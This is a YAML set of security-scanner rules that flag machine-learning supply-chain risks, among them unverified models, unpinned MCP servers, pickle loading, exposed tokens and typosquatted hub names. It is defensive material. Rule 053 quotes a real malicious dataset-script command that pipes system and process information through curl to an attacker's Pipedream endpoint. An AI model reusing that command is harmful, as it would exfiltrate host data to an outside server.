- id: MEDUSA-MLSC-SCAN-049
  name: model-fine-tune-from-unverified-base
  severity: MEDIUM
  category: ml_supply_chain
  patterns:
  - (?i)trainer\s*=\s*Trainer\s*\([^)]*model\s*=\s*AutoModel\.from_pretrained
  - (?i)model\.train\s*\(\s*\).*from_pretrained\s*\(['"][^'"]+['"]\)
  - (?i)SFTTrainer\s*\([^)]*model_name_or_path\s*=\s*['"][^'"]{5,}['"]
  file_types:
  - '*.py'
  - '*.ipynb'
  - '*.yaml'
  - '*.yml'
  message: Fine-tuning from base model without integrity verification — compromised
    base model propagates to fine-tuned descendants
  description: 'Model fine-tuning initiated from a base model loaded without integrity
    verification. Stalnaker et al. (2025) documented Supply Chain Provenance Opacity
    as a key attack surface: models fine-tuned from a compromised base model propagate
    the compromise to all downstream fine-tuned variants. The non-linear supply chain
    structure (fine-tuning, quantization, distillation, multi-model architectures)
    means a single compromised base model like Llama or Mistral could cascade to hundreds
    of fine-tuned descendants. Meiklejohn et al. (ICML 2025) confirmed training data
    poisoning as a concrete attack: a model trained on poisoned data introduces backdoors
    or biases that are inherited through subsequent fine-tuning. Vassilev et al. (NIST
    AI 100-2e2023) classify backdoor poisoning at pre-training/fine-tuning stage as
    a supply chain attack.

    '
  remediation: 'Verify the integrity of base models before initiating fine-tuning:
    check commit hash, verify publisher signature, and validate against a known-good
    checksum. Record base model hash in training metadata and model card. Use only
    verified, signed base models from official publishers. Implement provenance tracking
    in fine-tuning pipelines.

    '
  owasp_llm: LLM04:2025
  cwe: CWE-345
- id: MEDUSA-MLSC-SCAN-050
  name: mcp-config-unverified-server
  severity: HIGH
  category: ml_supply_chain
  patterns:
  - (?i)"command"\s*:\s*"(?:npx|uvx|node|python)"[^}]*"args"\s*:\s*\[
  - (?i)mcp.*config.*json.*"server".*"url"\s*:\s*"https?://
  - (?i)\.mcp\.json.*"command".*(?:npx|uvx)
  file_types:
  - '*.json'
  - .mcp.json
  - mcp.json
  - '*.yaml'
  - '*.yml'
  message: MCP server configuration without version pinning or hash verification —
    rug pull attack surface
  description: 'MCP (Model Context Protocol) server configuration specifying a server
    to install via npx, uvx, or similar without pinned version or hash verification.
    Pautsch et al. (2025) named MCP Server Rug Pull as a key supply chain risk: an
    agent or MCP server published to a registry is later modified (or replaced) by
    the original publisher or an attacker who compromised the publisher. Autonomous
    agents that consume the compromised MCP server inherit the attack. The npm leftpad
    incident pattern applies: a popular MCP server package can be modified to include
    malicious code after widespread adoption, cascading across all dependent pipelines.
    Pautsch et al. noted that a single maintainer account controlling many agents
    creates a concentrated attack target analogous to npm''s maintainer concentration
    problem documented by Zimmermann et al.

    '
  remediation: 'Pin MCP server versions to specific versions with SHA integrity hashes.
    Use lock files (package-lock.json for npm, uv.lock for uvx) to prevent unexpected
    updates. Audit MCP server source code before deployment. Prefer MCP servers from
    verified publishers with signed packages. Monitor for unexpected updates to configured
    MCP server versions.

    '
  owasp_llm: LLM03:2025
  cwe: CWE-494
- id: MEDUSA-MLSC-SCAN-051
  name: huggingface-retrieval-rag-pickle-chain
  severity: CRITICAL
  category: ml_supply_chain
  patterns:
  - (?i)retrieval_rag\.py.*pickle\.load
  - (?i)from_pretrained\s*\([^)]*RagRetriever
  - (?i)RagSequenceForGeneration\.from_pretrained.*_name_or_path
  file_types:
  - '*.py'
  - '*.ipynb'
  message: RAG retriever pipeline uses pickle.load — _name_or_path config redirect
    enables RCE via RAG config poisoning
  description: 'RAG (Retrieval-Augmented Generation) retriever pipeline loading via
    Transformers library that uses pickle.load internally. Ding et al. (2025) documented
    a confirmed attack chain: the Transformers library''s retrieval_rag.py contains
    pickle.load, which when combined with a malicious config.json where _name_or_path
    redirects to an attacker-controlled repository, enables Remote Code Execution.
    CONFIGSCAN confirmed hauson-fan/RagRetriever and HuggingWorm/RagRetriever as real-world
    malicious configurations exploiting this exact chain. This is a compound attack:
    config file poisoning (non-weight attack vector) combined with an existing pickle.load
    in the Transformers library achieves RCE without requiring a malicious model weight
    file. Existing model scanners miss this because they focus on model weights, not
    configuration files.

    '
  remediation: 'Audit config.json _name_or_path values before loading RAG retrievers.
    Use CONFIGSCAN (Ding et al. 2025) to scan configuration files. Ensure transformers
    library is updated (Hugging Face has been notified of this vulnerability chain).
    Verify that _name_or_path matches the repository from which you are loading the
    model. Never load RAG configurations from untrusted sources.

    '
  owasp_llm: LLM03:2025
  cwe: CWE-610
- id: MEDUSA-MLSC-SCAN-052
  name: model-quantization-gguf-unsafe-load
  severity: MEDIUM
  category: ml_supply_chain
  patterns:
  - (?i)llama_cpp\.Llama\s*\([^)]*model_path\s*=\s*(?!local_path|os\.path)
  - (?i)from_pretrained.*gguf.*(?!revision\s*=\s*['"][a-f0-9]{40})
  - (?i)AutoModelForCausalLM\.from_pretrained.*gguf_file\s*=
  file_types:
  - '*.py'
  - '*.ipynb'
  message: GGUF quantized model loaded without integrity verification — quantized
    model supply chain risk
  description: 'GGUF quantized model (llama.cpp format) loaded without integrity verification.
    GGUF models are a fast-growing format for quantized LLMs and represent a distinct
    supply chain attack surface. While GGUF format is binary but not pickle-based,
    malicious GGUF files can contain corrupt tensor data designed to trigger bugs
    in the llama.cpp C++ parser, potentially leading to buffer overflows or memory
    corruption. The quantized model ecosystem (GGUF, AWQ, GPTQ, ExLlamaV2) distributes
    many third-party quantizations of base models from unofficial publishers. Meiklejohn
    et al. (ICML 2025) documented that namesquatting is not limited to base models
    — quantized variants with misleading publisher names are equally viable attack
    vectors. Stalnaker et al. (2025) found the Hugging Face supply chain complex with
    quantization creating additional dependency hops.

    '
  remediation: 'Download GGUF files from official publishers or verified quantizers
    with established track records. Verify SHA-256 hash of GGUF files before loading.
    Use models from the official Hugging Face org for the base model (e.g., TheBloke
    was the dominant quantizer but has been succeeded by official publisher quantizations).
    Keep llama.cpp updated to latest version to benefit from parser security fixes.

    '
  owasp_llm: LLM03:2025
  cwe: CWE-494
- id: MEDUSA-MLSC-SCAN-053
  name: dataset-script-network-callback
  severity: CRITICAL
  category: ml_supply_chain
  patterns:
  - (?i)class\s+\w+Dataset.*:\s*[\s\S]{0,500}requests\.(?:get|post)\s*\(
  - (?i)def\s+_generate_examples.*urllib\.request
  - (?i)_URLS\s*=\s*\{[^}]*\}.*(?:subprocess|os\.system)
  file_types:
  - '*.py'
  - '*.ipynb'
  message: Dataset loading script makes network callbacks — potential system information
    exfiltration payload
  description: 'Dataset loading script (HuggingFace Datasets-format) contains network
    callbacks (requests.get, urllib.request) in data generation code. Zhao et al.
    (ASE ''24) discovered and documented the real-world malicious dataset loading
    script ''Yash2998db/stan_small'' which ran subprocess.check_output(''(uname -a;
    ps auxww) | curl -s https://eoxvp5idbpacu69.m.pipedream.net/$(whoami) --data-binary
    @-'', shell=True), exfiltrating system information (OS version, process list,
    username) to an attacker''s Pipedream server on dataset load. Zhao et al. found
    9 malicious dataset loading scripts total. Network callbacks in _generate_examples()
    methods are particularly suspicious as they are called for every data point loaded,
    potentially enabling exfiltration at scale.

    '
  remediation: 'Never use datasets.load_dataset() with trust_remote_code=True on untrusted
    datasets. Audit dataset loading scripts for any network calls before enabling
    trust_remote_code. Use only curated, verified dataset scripts. Implement egress
    filtering on data loading environments. Report suspicious dataset loading scripts
    to Hugging Face security team.

    '
  owasp_llm: LLM03:2025
  cwe: CWE-200
- id: MEDUSA-MLSC-SCAN-054
  name: model-mirror-without-signing-verification
  severity: MEDIUM
  category: ml_supply_chain
  patterns:
  - (?i)ENDPOINT\s*=\s*['"]https?://(?!huggingface\.co|hf\.co)[^'"]+['"]
  - (?i)HF_ENDPOINT\s*=\s*['"]https?://(?!huggingface\.co)[^'"]+['"]
  - (?i)hf_hub.*endpoint.*(?!huggingface\.co)
  file_types:
  - '*.py'
  - '*.sh'
  - '*.bash'
  - '*.yaml'
  - '*.yml'
  message: Custom Hugging Face endpoint configured — model mirror without signing
    verification loses registry security guarantees
  description: 'Custom Hugging Face Hub endpoint configured, routing model downloads
    through a non-official mirror or proxy. Kalu & Davis (2025) argue that artifacts
    traversing trust boundaries (mirrors, corporate proxies, re-hosting) lose registry
    security guarantees — exactly the scenario when HF_ENDPOINT is configured to an
    internal mirror. Siddiq et al. (2026) documented AiTM cache poisoning as a real
    attack scenario (S3): attacker intercepts or tampers with model distribution channel
    during transfer or dependency resolution via compromised mirrors or proxy layers.
    Without signing verification (fewer than 2% of HF models are signed per Meiklejohn
    et al. 2025), a mirror cannot prove the authenticity of served models, enabling
    substitution attacks.

    '
  remediation: 'If using an internal mirror of Hugging Face Hub, implement artifact
    signing and verification at the mirror boundary. Verify SHA-256 hashes of models
    served by internal mirrors against official Hugging Face Hub checksums. Implement
    Sigstore verification for models that support it. Ensure mirror synchronization
    integrity is monitored and any substitution is detected.

    '
  owasp_llm: LLM03:2025
  cwe: CWE-494
- id: MEDUSA-MLSC-SCAN-055
  name: ml-sbom-absent-in-deployment
  severity: LOW
  category: ml_supply_chain
  patterns:
  - (?i)docker.*(?:pytorch|tensorflow|transformers|cuda)(?!.*sha256|.*--verify)
  - (?i)FROM\s+(?:pytorch|tensorflow|huggingface|nvidia)/[^\s]+(?!@sha256:)
  - (?i)image:\s*(?:pytorch|tensorflow|huggingface)/[^\s]+(?!@sha256:)
  file_types:
  - Dockerfile
  - '*.dockerfile'
  - '*.yaml'
  - '*.yml'
  message: ML Docker base image not pinned to digest — container supply chain integrity
    gap
  description: 'ML Docker base image specified by tag rather than SHA256 digest, creating
    supply chain integrity risk. Mutable Docker tags (pytorch/pytorch:latest, tensorflow/tensorflow:2.13.0)
    can be updated by the publisher or compromised, causing different images to be
    pulled on subsequent builds. Kalu & Davis (2025) argue that the same trust boundary
    problem affecting package registries applies equally to container registries:
    a mirror or registry proxy can substitute a different layer without detection
    unless the digest is verified. Meiklejohn et al. (ICML 2025) extended supply chain
    integrity concerns to all ML artifacts — container images are part of the ML supply
    chain as they contain ML framework versions, CUDA drivers, and pre-installed model
    artifacts.

    '
  remediation: 'Pin Docker base images to SHA256 digests: FROM pytorch/pytorch@sha256:abc123...
    Use docker image inspect to get the digest for a known-good image. Implement container
    image scanning (Trivy, Snyk Container) as part of ML CI/CD. Generate SBOMs for
    container images (syft, docker sbom) as part of the ML supply chain documentation.

    '
  owasp_llm: LLM03:2025
  cwe: CWE-494
- id: MEDUSA-MLSC-SCAN-056
  name: pymilo-json-alternative-not-used
  severity: LOW
  category: ml_supply_chain
  patterns:
  - (?i)from\s+sklearn\..*import.*(?:LinearRegression|LogisticRegression|RandomForest|SVM|GradientBoosting)
  - (?i)sklearn\..*fit\s*\(.*\).*(?:pickle\.dump|joblib\.dump)
  - (?i)model\.fit\s*\(.*\).*pickle\.dump\s*\(model
  file_types:
  - '*.py'
  - '*.ipynb'
  message: scikit-learn model persisted with pickle/joblib — PyMilo JSON serialization
    available as safe alternative
  description: 'scikit-learn model being persisted using unsafe pickle or joblib serialization
    instead of transparent JSON alternatives. Rostami et al. (2024) developed PyMilo
    specifically to address this gap: a Python library for transparent, reliable,
    and safe ML model I/O by serializing traditional ML models (scikit-learn) into
    human-readable, non-executable JSON format. PyMilo eliminates the arbitrary code
    execution attack vector for traditional ML models while preserving exact model
    behavior. Parida et al. (2025) found Pickle and Joblib to be the most challenging
    to integrate AND the most insecure formats — making migration to JSON-based PyMilo
    beneficial for both security and integration. PyMilo is available at https://github.com/openscilab/pymilo.

    '
  remediation: 'Use PyMilo (pip install pymilo) for scikit-learn model serialization
    instead of pickle or joblib. PyMilo produces transparent JSON that can be audited
    for unexpected content. For deep learning models (not supported by PyMilo), use
    safetensors format. Migration is a drop-in: replace pickle.dump(model, f) with
    pymilo.Export(model, file_path).

    '
  owasp_llm: LLM03:2025
  cwe: CWE-502
- id: MEDUSA-MLSC-SCAN-057
  name: model-access-token-passed-to-subprocess
  severity: CRITICAL
  category: ml_supply_chain
  patterns:
  - (?i)subprocess\.(?:run|call|Popen)\s*\([^)]*(?:HF_TOKEN|hf_token|HUGGINGFACE_TOKEN)
  - (?i)os\.system\s*\(.*(?:HF_TOKEN|hf_token|api_key)
  - (?i)shell\s*=\s*True.*(?:HF_TOKEN|hf_token|token)
  file_types:
  - '*.py'
  - '*.ipynb'
  - '*.sh'
  message: ML API token passed to subprocess/shell — token exposure via process list
    and shell history
  description: 'Hugging Face token or ML API key passed directly to a subprocess or
    shell command. Tokens passed as command-line arguments are visible to other processes
    via /proc/ pseudo-filesystem, are captured in shell history files, and appear
    in process monitoring tools. Siddiq et al. (2026) found CWE-259 (hard-coded passwords)
    and credential exposure among the most prevalent weaknesses: 10,097 instances
    on HF (10.62%), with Hugging Face tokens granting access to private repositories
    creating an amplified supply chain risk. Passing tokens via shell commands in
    ML training scripts is common in notebook-to-production migrations where developers
    copy interactive commands directly into automation scripts. Zhao et al. (ASE ''24)
    classified token/credential exposure as part of the sensitive information theft
    category of malicious model payloads.

    '
  remediation: 'Pass API tokens via environment variables, not command-line arguments.
    Use os.environ for passing credentials to subprocesses: env=dict(os.environ, HF_TOKEN=...).
    Never include tokens in shell commands that appear in process listings. Use huggingface_hub.login()
    for authentication rather than passing tokens to CLI tools. Rotate any token that
    has been passed as a command-line argument.

    '
  owasp_llm: LLM03:2025
  cwe: CWE-214
- id: MEDUSA-MLSC-SCAN-058
  name: model-format-conversion-without-validation
  severity: MEDIUM
  category: ml_supply_chain
  patterns:
  - (?i)convert_hf_to_gguf\.py
  - (?i)optimum.*export.*onnx\s*(?!--atol|--validate)
  - (?i)torch\.onnx\.export\s*\([^)]*\)(?!.*onnx\.checker)
  file_types:
  - '*.py'
  - '*.sh'
  - '*.bash'
  message: Model format conversion without validation — converted model integrity
    not verified
  description: 'Model format conversion (to GGUF, ONNX, safetensors) without output
    validation. Parida et al. (2025) specifically noted that ONNX conversion from
    native formats can introduce accuracy degradation issues and potentially introduce
    structural problems. Model format conversion is a non-trivial transformation —
    a malicious actor controlling the conversion tooling or a compromised conversion
    script could introduce subtle weight modifications during conversion that survive
    format boundaries. Converting between formats without running onnx.checker.check_model()
    (for ONNX) or safetensors validation (for safetensors) means the converted model''s
    integrity is unverified. This is particularly relevant as many GGUF models on
    Hugging Face are third-party conversions where conversion script provenance is
    unknown.

    '
  remediation: 'Run format-specific validation after conversion: onnx.checker.check_model()
    for ONNX, safetensors.safe_open() validation for safetensors. Compare model output
    on a test input before and after conversion to verify behavioral equivalence.
    Sign converted model artifacts and publish conversion provenance. Use official
    conversion scripts from trusted publishers (e.g., huggingface/transformers convert_*.py).

    '
  owasp_llm: LLM03:2025
  cwe: CWE-345
- id: MEDUSA-MLSC-SCAN-059
  name: agent-abandoned-stale-version
  severity: LOW
  category: ml_supply_chain
  patterns:
  - (?i)langchain.*(?:0\.0\.[0-9]{1,2}|0\.1\.[0-9])['"]
  - (?i)openai.*(?:0\.[0-9]+\.[0-9]+)['"].*#.*deprecated
  - (?i)transformers.*(?:3|4\.[0-9]\.[0-9])['"].*#\s*(?:old|legacy|deprecated)
  file_types:
  - '*.txt'
  - '*.cfg'
  - '*.toml'
  - requirements*.txt
  message: Stale/deprecated ML framework version pinned — abandoned version may contain
    unpatched vulnerabilities
  description: 'Stale or deprecated ML framework version explicitly pinned. Pautsch
    et al. (2025) identified Stale/Abandoned Agent Risk as a distinct supply chain
    concern: agents and tools that stop updating remain discoverable and appear healthy
    while accumulating unpatched vulnerabilities. This applies equally to ML framework
    dependencies: teams that pin old LangChain (0.0.x), old OpenAI SDK, or old Transformers
    versions to avoid migration work inherit all CVEs in those versions without receiving
    patches. Kalu & Davis (2025) note that stale dependencies are particularly dangerous
    at trust boundaries — an internal mirror propagating stale versions creates a
    concentration point for known-vulnerable packages. The ML supply chain''s rapid
    evolution means even 6-month-old framework versions may have critical security
    patches.

    '
  remediation: 'Establish a regular dependency update cadence (quarterly minimum)
    for ML frameworks. Subscribe to security advisories for core ML packages (PyPI
    advisory, GitHub dependabot alerts). Maintain a tested upgrade path for major
    ML framework version bumps. Remove deprecated/EOL version pins and document the
    security motivation for any version pin.

    '
  owasp_llm: LLM03:2025
  cwe: CWE-1188
- id: MEDUSA-MLSC-SCAN-060
  name: model-hub-typosquatting-org-name
  severity: HIGH
  category: ml_supply_chain
  patterns:
  - (?i)from_pretrained\s*\(['"](?:meta.llama|metaIlama|meta1lama|mistral-?ai-?official|deepseek.ai.official)['"]
  - (?i)from_pretrained\s*\(['"](?:google-?official|googIe|g00gle-?ai|microsoft-?ai-?official)['"]
  - (?i)huggingface\.co/(?:mistral-?ai-?team|deepseek-?official|qwen-?ai|alibaba-?qwen)
  file_types:
  - '*.py'
  - '*.ipynb'
  - '*.yaml'
  - '*.yml'
  - '*.txt'
  message: Potential model hub organization name typosquat — verify exact publisher
    identity before loading
  description: 'Potential typosquatting of official ML publisher organization names
    on model hubs. Meiklejohn et al. (ICML 2025) documented real-world namesquatting
    attacks on Hugging Face where attackers create accounts mimicking official organizations
    to distribute malicious models. Official organization names: meta-llama, mistralai,
    deepseek-ai, Qwen (Alibaba), google, microsoft. Typosquats observed in the wild
    use hyphen variations, zero/letter substitutions (g00gle, googIe), suffix additions
    (-official, -team, -ai), and whitespace variants. Fewer than 2% of Hugging Face
    models use cryptographic signing making visual name inspection the only defense
    available to most users. Meiklejohn et al. confirmed traditional antivirus cannot
    detect malicious ML models, making org-level typosquatting particularly dangerous
    as users trust the publisher identity.

    '
  remediation: 'Maintain an organizational allowlist of verified publisher names:
    meta-llama, mistralai, deepseek-ai, Qwen, google, microsoft, openai. Reject any
    from_pretrained() call not matching allowlisted organizations without explicit
    security review. Cross-reference publisher names against official organization
    websites. Implement automated typosquat detection using edit-distance checks against
    known legitimate publisher names.

    '
  owasp_llm: LLM03:2025
  cwe: CWE-345
